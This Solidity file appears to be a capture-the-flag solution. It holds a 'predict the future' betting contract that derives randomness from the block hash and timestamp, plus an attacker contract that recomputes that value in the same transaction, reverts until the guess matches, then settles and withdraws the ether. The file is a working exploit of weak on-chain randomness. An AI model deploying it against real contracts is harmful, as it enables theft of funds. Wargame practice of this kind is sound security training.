pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract PredictTheFuture {
    address challengeAddr;
    uint8 chosedAnswer;

    function PredictTheFuture(address _challengeAddr) public payable{
        require(msg.value == 1 ether);
        challengeAddr = _challengeAddr;

        // Instanciating the challenge contract
        PredictTheFutureChallenge challengeContract = PredictTheFutureChallenge(challengeAddr);

        // Setting an answer
        chosedAnswer = 0;
        challengeContract.lockInGuess.value(msg.value)(chosedAnswer);
    }

    function settle() public{
        // If i will fail the challenge just return the number
        uint8 number = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        require(number == chosedAnswer);

        // Send the settle in
        PredictTheFutureChallenge challengeContract = PredictTheFutureChallenge(challengeAddr);
        challengeContract.settle();

        // Get back my ethers
        msg.sender.transfer(this.balance);
    }

    // Fallback function to receive paymennt
    function() external payable {}

    function retrieveFuds() public {
        msg.sender.transfer(this.balance);
    }
}